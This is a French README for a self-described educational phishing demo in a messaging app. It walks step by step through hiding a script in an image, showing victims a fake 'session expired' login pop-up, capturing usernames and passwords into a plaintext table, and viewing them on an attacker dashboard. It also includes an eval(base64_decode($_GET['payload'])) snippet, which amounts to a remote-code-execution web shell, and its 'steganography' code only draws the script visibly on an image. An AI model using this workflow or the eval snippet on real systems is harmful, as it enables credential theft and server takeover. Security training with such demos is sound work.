# 📧 Système de Démonstration Éducative de Phishing

## Vue d'ensemble
Ce projet démontre comment fonctionne une attaque de phishing par stéganographie dans un contexte éducatif.

---

## 🎯 Flux d'attaque

### 1. **Attaquant (Utilisateur A)**
- Crée un lien ou une page contenant le script de phishing
- Envoie une image stéganographiée contenant ce script via la messagerie
- Accède au dashboard pour voir les identifiants capturés

### 2. **Victime (Utilisateur B)**
- Reçoit l'image dans la messagerie
- Visualise ou clique sur l'image
- Un pop-up de fausse connexion s'affiche
- Entre ses identifiants
- Les identifiants sont capturés et envoyés à l'attaquant

### 3. **Serveur**
- Reçoit les identifiants via `/codes/fake_login/phishing.php`
- Les stocke dans la table `phishing_captures`
- L'attaquant peut les consulter sur son dashboard

---

## 📁 Fichiers créés

| Fichier | Utilité |
|---------|---------|
| `codes/assets/popup.js` | Script qui affiche le pop-up de fausse connexion |
| `codes/fake_login/index.php` | Fausse page de connexion (fallback) |
| `codes/fake_login/phishing.php` | Endpoint qui capture les identifiants |
| `codes/fake_login/dashboard.php` | Dashboard pour voir les identifiants capturés |

---

## 🚀 Guide d'utilisation

### Étape 1: Configuration de la stéganographie

Pour utiliser une image stéganographiée:

1. **Générez le code de stéganographie à inclure:**
```html
<script src="/messagerie/codes/assets/popup.js?sender=VOTRE_USER_ID"></script>
```
Remplacez `VOTRE_USER_ID` par votre ID utilisateur réel.

2. **Utilisez un outil de stéganographie** pour cacher ce code dans une image:
   - Outils recommandés: SilentEye, Steghide, OpenStego
   - Ou écrivez un script PHP pour automatiser cela

### Étape 2: Envoi du message avec l'image

1. Connectez-vous à la messagerie
2. Envoyez un message à votre cible avec l'image stéganographiée
3. Le message peut contenir un lien ou simplement inviter à visualiser l'image

### Étape 3: Exécution du phishing

**Quand la victime:**
- Clique sur un lien contenant le script
- Ou visualise une image contenant le script

**Le pop-up s'affiche avec:**
- Message: "Votre session a expiré"
- Champs: Nom d'utilisateur + Mot de passe
- Bouton: "Se reconnecter"

### Étape 4: Capture des identifiants

Quand la victime soumet le formulaire:
1. Les identifiants sont envoyés à `phishing.php`
2. Ils sont stockés dans la table `phishing_captures`
3. L'attaquant peut les voir sur son dashboard

### Étape 5: Consultation du dashboard

Accédez à votre dashboard:
- URL: `/messagerie/codes/fake_login/dashboard.php`
- Vous verrez tous les identifiants capturés avec:
  - Nom d'utilisateur et mot de passe
  - Date/heure de capture
  - Adresse IP du client

---

## 🔧 Intégration avec la stéganographie

### Option 1: Script PHP de stéganographie

Créez un fichier `steganography.php`:

```php
<?php
// Créer une image simple et y ajouter le texte du script
$image = imagecreate(200, 200);
$backgroundColor = imagecolorallocate($image, 255, 255, 255);
$textColor = imagecolorallocate($image, 0, 0, 0);

imagefilledrectangle($image, 0, 0, 200, 200, $backgroundColor);

$script = "<script src='/messagerie/codes/assets/popup.js?sender=" . $_SESSION['user_id'] . "'></script>";

// Écrire le texte (c'est simplifié, la vraie stéganographie est plus complexe)
imagestring($image, 1, 10, 10, $script, $textColor);

imagepng($image, 'steganographic_image.png');
imagedestroy($image);
?>
```

### Option 2: Utiliser SilentEye (CLI)

```bash
silentEye encode -img image.png -t script.txt -p password -out output.png
```

### Option 3: Extraction PHP (pour tester)

```php
<?php
// Exécuter le contenu stéganographié trouvé dans l'image
eval(base64_decode($_GET['payload']));
?>
```

---

## ⚠️ Mesures de sécurité (Démonstration Éducative)

**Important:** Ce code est conçu UNIQUEMENT pour la démonstration éducative dans un environnement contrôlé.

### Limitations intentionnelles:
1. ✓ Mot de passe stocké en clair (pour la démo)
2. ✓ Pas de chiffrement SSL/TLS
3. ✓ Pas de validation d'IP
4. ✓ Pas de rate-limiting

### Pour un vrai système, vous feriez:
1. Hacher les mots de passe avec bcrypt
2. Forcer HTTPS/SSL
3. Valider les sources
4. Implémenter le rate-limiting
5. Ajouter des logs de sécurité
6. Utiliser des tokens CSRF

---

## 🎓 Concepts pédagogiques

### Ce que les étudiants apprennent:

1. **Comment fonctionne le phishing:**
   - Usurpation d'identité
   - Manipulation psychologique
   - Captage d'identifiants

2. **Techniques d'attaque:**
   - Stéganographie (cacher du code dans des images)
   - Pop-ups trompeurs
   - Redirection de formulaires

3. **Sécurité web:**
   - Validation des entrées
   - Gestion des sessions
   - Chiffrement
   - Rate-limiting

4. **Sensibilisation des utilisateurs:**
   - Comment reconnaître un phishing
   - Vérifier les URLs
   - Être méfiant des pop-ups

---

## 🧪 Test de la démo

### Scénario de test:

1. Créez 2 comptes: `Attaquant` et `Victime`
2. Connectez-vous en tant qu'Attaquant
3. Accédez: `/messagerie/codes/fake_login/dashboard.php`
4. Copiez l'URL du script dans un message à Victime
5. Connectez-vous en tant que Victime
6. Cliquez sur le lien
7. Le pop-up s'affiche
8. Entrez les identifiants de test
9. Retournez au dashboard d'Attaquant
10. Les identifiants sont visibles!

---

## 📊 Structure de la base de données

```sql
CREATE TABLE phishing_captures (
    id INT AUTO_INCREMENT PRIMARY KEY,
    sender_id INT NOT NULL,
    captured_username VARCHAR(255) NOT NULL,
    captured_password VARCHAR(255) NOT NULL,
    captured_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    ip_address VARCHAR(45),
    user_agent TEXT,
    FOREIGN KEY (sender_id) REFERENCES users(id)
);
```

---

## 🔐 Variables d'environnement

Le script utilise les paramètres GET suivants:

- `sender`: ID de l'utilisateur qui a lancé l'attaque
- `payload`: (Optionnel) Donnée stéganographiée

---

## 📝 Notes importantes

1. ✓ Cette démo utilise le protocole HTTP (pas de SSL/TLS)
2. ✓ Les mots de passe sont stockés en clair
3. ✓ Ne pas utiliser en production
4. ✓ À usage éducatif uniquement
5. ✓ Respecter l'éthique et la loi

---

## 🎯 Extensions possibles

- [ ] Ajouter la stéganographie réelle d'images
- [ ] Implémenter des variantes de phishing (email, SMS, etc.)
- [ ] Analyser les patterns d'attaque
- [ ] Créer un système de détection
- [ ] Simuler les défenses
- [ ] Logger les tentatives de phishing

---

**Créé pour**: Projet de cybersécurité - Démonstration éducative  
**Date**: 2026  
**Cadre**: Formation à la sécurité informatique
